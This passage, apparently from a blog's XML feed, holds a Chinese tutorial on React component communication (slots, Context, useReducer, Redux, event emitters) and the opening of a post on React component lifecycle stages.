class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">className</span>=<span class="string">&quot;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">strong</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/#&quot;</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">NavBar1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        // 单标签</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavBar2</span> <span class="attr">leftSlot</span>=<span class="string">&#123;leftJsx&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                 <span class="attr">centerSlot</span>=<span class="string">&#123;</span>&lt;<span class="attr">strong</span>&gt;</span>bbb<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&#125;</span></span><br><span class="line"><span class="language-xml">                 rightSlot=&#123;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/#&quot;</span>&gt;</span>ccc<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#125;/&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /><strong>子组件 1：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">NavBar1</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// this.props.children;</span></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;nav-item nav-bar&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;nav-left&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;this.props.children[0]&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;nav-item nav-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;this.props.children[1]&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;nav-item nav-right&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;this.props.children[2]&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 在这个组件中，父组件向子组件传入了三个元素，在子组件的props中的children中会接收到一个数组，数组中包含了这三个元素</span></span><br><span class="line"><span class="comment">// 当然，这样写是有一定弊端的，因为数组中的元素的数量可能和需要的数量不一致，就有可能将元素渲染位置错误</span></span><br></pre></td></tr></table></figure><p><br /><strong>子组件 2：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">NavBar2</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;leftSlot, centerSlot, rightSlot&#125; = <span class="variable language_">this</span>.<span class="property">props</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;nav-item nav-bar&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;nav-left&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;leftSlot&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;nav-item nav-center&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;centerSlot&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;nav-item nav-right&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;rightSlot&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这父组件中，使用了单标签，使用属性的方式将元素进行传递，在子组件中接收父组件中传递来的元素结构，在进行渲染。</span></span><br><span class="line"><span class="comment">// 这种方式会比上面子组件1的方式好一些。</span></span><br></pre></td></tr></table></figure><p><br />这样，我们就实现了插槽的效果。</p><p><a name="VG4G5"></a></p><h2 id="5-跨级组件通信"><a href="#5-跨级组件通信" class="headerlink" title="5. 跨级组件通信"></a>5. 跨级组件通信</h2><p>跨级组件通信就是父组件与子组件的子组件或者更深层次的通信，通俗点说就是祖先组件与后代组件的通信。这种场景下，我们可以让父组件传给子组件，再让子组件传给他自己的子孙组件，依次逐级传递。这样做当然是可以的，但是当层级关系超过两层时，这种传递方式麻烦且臃肿，不好维护。我们亟需一种解决方案，它可以简化我们一层一层传递 <code>props</code> 的方式。此时 <code>Context</code> 便油然而生，<code>Context</code> 通过组件树提供了一个传递数据的方法，从而避免了在每个层级手动的传递 <code>props</code> 属性。</p><p>祖先组件代码示例：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">PropTypes</span> <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span> <span class="comment">// 用于属性校验，想了解更多见文末的扩展阅读。</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Sub</span> <span class="keyword">from</span> <span class="string">&#x27;./Sub.js&#x27;</span> <span class="comment">// 中间组件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="comment">// 在父组件定义上下文（Context）</span></span><br><span class="line">  <span class="keyword">static</span> childContextTypes = &#123; <span class="comment">// 声明静态属性 必须要写</span></span><br><span class="line">    <span class="attr">color</span>: <span class="title class_">PropTypes</span>.<span class="property">string</span>, <span class="comment">// PropTypes 用于校验属性类型</span></span><br><span class="line">    <span class="attr">callback</span>: <span class="title class_">PropTypes</span>.<span class="property">func</span> <span class="comment">// 回调函数</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getChildContext</span>(<span class="params"></span>) &#123; <span class="comment">// 用于返回上下文（Context）的值便于后代获取</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">color</span>: <span class="string">&#x27;pink&#x27;</span>,</span><br><span class="line">      <span class="attr">callback</span>: <span class="variable language_">this</span>.<span class="property">callback</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>) <span class="comment">// 需要绑定this</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">callback</span>(<span class="params">msg</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(msg)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">Sub</span> /&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />中间组件代码示例：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">SubSub</span> <span class="keyword">from</span> <span class="string">&#x27;./SubSub.js&#x27;</span> <span class="comment">// 后代组件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Sub</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span>(</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">SubSub</span> /&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />后代组件代码示例：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">PropTypes</span> <span class="keyword">from</span> <span class="string">&#x27;prop-types&#x27;</span> <span class="comment">// 用于属性校验，想了解更多见文末的扩展阅读。</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> <span class="title class_">SubSub</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> contextTypes = &#123; <span class="comment">// 后代组件必须校验属性类型</span></span><br><span class="line">    <span class="attr">color</span>: <span class="title class_">PropTypes</span>.<span class="property">string</span>,</span><br><span class="line">    <span class="attr">callback</span>: <span class="title class_">PropTypes</span>.<span class="property">func</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> style = &#123;<span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">color</span>&#125; <span class="comment">// 通过 this.context 获取上下文的值</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">cb</span> = (<span class="params">msg</span>) =&gt; &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">context</span>.<span class="title function_">callback</span>(msg)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;</span> <span class="attr">style</span> &#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>In SubSub.js<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> // 粉色字体展示 In SubSub.js</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;cb(</span>&#x27;<span class="attr">this</span> <span class="attr">is</span> <span class="attr">SubSub.js</span>&#x27;)&#125;&gt;</span>click me<span class="tag">&lt;/<span class="name">button</span>&gt;</span> // 点击按钮，弹出 this is SubSub.js 字样</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />由上可以看出，祖先组件声明了 <code>Context</code> 上下文，后代组件通过 <code>this.context</code> 获取祖先传递下来的内容。</p><p><strong>注意：</strong>如果后代组件使用构造函数（<code>constructor</code>），那么 <code>context</code> 需要作为构造函数的第二个参数传入，否则无法使用。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span> (props, context) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props)</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="aVyeU"></a></p><h2 id="6-非嵌套组件通信"><a href="#6-非嵌套组件通信" class="headerlink" title="6. 非嵌套组件通信"></a>6. 非嵌套组件通信</h2><p><a name="PX87J"></a></p><h3 id="（1）Hooks"><a href="#（1）Hooks" class="headerlink" title="（1）Hooks"></a>（1）Hooks</h3><p>开发中经常会遇到这样一个场景，<code>FirstChild</code> 和 <code>SecondChild</code> 是我们的两个组件，<code>FirstChild</code> 组件 <code>dipatch action</code>，在 <code>SecondChild</code> 组件展示变化的数据。那么就需要在两个子组件之上的一层来设计 <code>context</code>。整个设计过程是这样的：</p><p>（1）首先建立 <code>Context</code>，存储一个初始状态和一个变更 state 的状态管理器：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Context.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> defaultState = &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">reducer</span>(<span class="params">state, action</span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span>(action.<span class="property">type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;ADD&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123; ...state, <span class="attr">value</span>: state.<span class="property">value</span> + <span class="number">1</span> &#125;;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;REDUCE&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123; ...state, <span class="attr">value</span>: state.<span class="property">value</span> - <span class="number">1</span> &#125;;</span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />（2）需要显性的声明 <code>Context.Provider</code> 把数据传给包裹组件，这里需要使用 <code>useReducer</code>，我们需要把 <code>reducer</code> 和默认的 <code>state</code> 作为 <code>useReducer</code> 的参数传入：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Content.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useReducer, createContext &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">FirstChild</span> <span class="keyword">from</span> <span class="string">&#x27;./FirstChild&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">SecondChild</span> <span class="keyword">from</span> <span class="string">&#x27;./SecondChild&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; reducer, defaultState &#125; <span class="keyword">from</span> <span class="string">&#x27;./Context&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">Context</span> = <span class="title function_">createContext</span>(<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">Content</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> [state, dispatch] = <span class="title function_">useReducer</span>(reducer, defaultState)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">Context.Provider</span> <span class="attr">value</span>=<span class="string">&#123;&#123;state,</span> <span class="attr">dispatch:</span> <span class="attr">dispatch</span>&#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">FirstChild</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">SecondChild</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">Context.Provider</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />（3）组件 <code>FirstChild</code> 有两个按钮 ‘<code>ADD</code>’ 和 ‘<code>REDUCE</code>’，点击两个按钮分别执行加 1 和减 1 操作：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useContext &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Context</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./Content&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">FirstChild</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">AppContext</span> = <span class="title function_">useContext</span>(<span class="title class_">Context</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123; AppContext.dispatch(&#123; type: &quot;ADD&quot; &#125;) &#125;&#125;&gt;ADD<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123; AppContext.dispatch(&#123; type: &quot;REDUCE&quot; &#125;) &#125;&#125;&gt;REDUCE<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">FirstChild</span></span><br></pre></td></tr></table></figure><p>（4）组件 <code>SecondChild</code> 展示当前 <code>state.value</code> ：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useContext &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Context</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./Content&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">SecondChild</span> () &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">AppContext</span> = <span class="title function_">useContext</span>(<span class="title class_">Context</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            &#123;AppContext.state.value&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">SecondChild</span>;</span><br></pre></td></tr></table></figure><br /><a name="DvymC"></a><h3 id="（2）Redux"><a href="#（2）Redux" class="headerlink" title="（2）Redux"></a>（2）Redux</h3><p>Redux 是一个独立的事件通讯插件。Redux 的基本原理实际上就是围绕着 <code>store</code> 进行的，这个 <code>store</code> 是通过 <code>createStore()</code> 方法创建的，它具有唯一性，可以认为是整个应用的数据存储中心，集中了大部分页面需要的状态数据。想要改变 <code>state</code> 的唯一方法就是触发 <code>Action</code>，<code>Reducer</code>接收到 <code>Action</code> 并更新数据 <code>store</code>。按照这个思想，Redux 适用于多交互、多数据源的场景。</p><p><a name="ostVb"></a></p><h3 id="（3）发布订阅者模式"><a href="#（3）发布订阅者模式" class="headerlink" title="（3）发布订阅者模式"></a>（3）发布订阅者模式</h3><p>可以使用 <code>events</code> 插件实现发布订阅者模式，此机制适用于 React 中兄弟组件间的通信。</p><p>首先安装 events:</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install events -S</span><br></pre></td></tr></table></figure><p>初始化：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// events.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">EventEmitter</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;events&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">EventEmitter</span>()</span><br></pre></td></tr></table></figure><p>注册监听事件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入定义的 EventEmitter 实例</span></span><br><span class="line"><span class="keyword">import</span> eventEmitter <span class="keyword">from</span> <span class="string">&#x27;./events&#x27;</span></span><br><span class="line">eventEmitter.<span class="title function_">addListener</span>(<span class="string">&#x27;changeSiblingsData&#x27;</span>, <span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">        <span class="attr">bus</span>: msg</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(msg)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>触发：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> eventEmitter <span class="keyword">from</span> <span class="string">&#x27;./events&#x27;</span></span><br><span class="line">eventEmitter.<span class="title function_">emit</span>(<span class="string">&#x27;changeSiblingsData&#x27;</span>, msg)</span><br></pre></td></tr></table></figure><p>发布订阅者模式其实就是注册需要的事件，在某些操作的时候，触发该事件即可。它是由事件驱动的。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React生命周期</title>
      <link href="/2023/07/25/frontend/react/react-sheng-ming-zhou-qi/"/>
      <url>/2023/07/25/frontend/react/react-sheng-ming-zhou-qi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="nGNYI"></a></p><h2 id="1-React-生命周期概览"><a href="#1-React-生命周期概览" class="headerlink" title="1. React 生命周期概览"></a>1. React 生命周期概览</h2><p>React 会把状态的变更更新到 UI，状态的变更过程必然会经历组件的生命周期。所谓的生命周期就是组件从创建到销毁的过程，它是一个很抽象的概念， React 通常将组件生命周期分为三个阶段：<br />● 装载阶段（<code>Mount</code>），组件第一次在 DOM 树中被渲染的过程；<br />● 更新过程（<code>Update</code>），组件状态发生变化，重新更新渲染的过程；<br />● 卸载过程（<code>Unmount</code>），组件从 DOM 树中被移除的过程；</p><p>有生命周期，那自然就会有生命周期钩子函数，它告诉我们当前处于哪些阶段，会对组件内部实现的某些函数进行回调，我们可以在这些回调函数中编写自己的逻辑代码，来完成自己的需求功能：<br />● 比如实现<code>componentDidMount</code>函数：组件已经挂载到 DOM 上时，就会回调；<br />● 比如实现<code>componentDidUpdate</code>函数：组件已经发生了更新时，就会回调；<br />● 比如实现<code>componentWillUnmount</code>函数：组件即将被移除时，就会回调；</p><p><strong>注意：</strong>我们所说的生命周期针对的是类组件，函数组件是没有生命周期的。</p><p>下面是 React 生命周期的图示（16.4 版本+）：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605688879048-b8d39c49-b1a1-4317-8dab-f7db088116e9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1605688879048-b8d39c49-b1a1-4317-8dab-f7db088116e9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="SZoKw"></a></p><h2 id="2-组件挂载阶段"><a href="#2-组件挂载阶段" class="headerlink" title="2. 组件挂载阶段"></a>2. 组件挂载阶段</h2><p>挂载阶段组件被创建，然后组件实例插入到 DOM 中，完成组件的第一次渲染，该过程只会发生一次，在此阶段会依次调用以下这些方法：<br />● <code>constructor</code><br />● <code>getDerivedStateFromProps</code><br />● <code>render</code><br />● <code>componentDidMount</code></p><p><a name="RUpom"></a></p><h3 id="（1）constructor"><a href="#（1）constructor" class="headerlink" 